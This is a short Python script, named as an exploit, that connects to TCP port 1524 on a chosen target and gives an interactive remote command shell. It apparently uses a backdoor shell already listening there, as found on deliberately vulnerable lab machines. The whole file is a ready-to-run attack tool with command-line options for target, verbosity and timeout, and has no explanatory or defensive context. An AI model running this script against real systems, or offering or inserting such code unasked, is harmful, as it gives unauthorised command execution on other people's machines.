#-*-coding: utf-8-*-
from socket import socket, AF_INET, SOCK_STREAM
from sys import argv
from optparse import OptionParser as opt
def exploit(ip, prnt, timeout):
	try:
		if(prnt):
			print("[+]Connecting to {} in 1524".format(ip));
		shell = socket(AF_INET, SOCK_STREAM);
		shell.connect((ip, 1524));
		shell.settimeout(timeout);
		promp = shell.recv(1024).decode();
	except Exception as e:
		if(prnt):
			print(e);
		exit()
	else:
		cmd = "";
		while(cmd != "exit"):
			cmd = input(promp);
			shell.send(cmd.encode());
			print(shell.recv(1024).decode());
def main():
	op = opt("Usage: %prog [flags] [values]");
	op.add_option("-t", "--target", dest="ip", default="127.0.0.1",  help="Set target.");
	op.add_option("-p", "--print",dest="prnt", action="store_false", default=True, help="If you active this, the program will not print stuff.");
	op.add_option("-o", "--timeout",dest="timeout", default=5, type="int", help="Set time out. ");
	(o, argv) = op.parse_args();
	exploit(o.ip, o.prnt, o.timeout);


if __name__ == '__main__':
	main()